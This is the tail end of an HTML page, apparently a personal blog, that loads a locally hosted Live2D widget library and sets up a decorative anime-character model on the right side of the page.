+})</script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html>
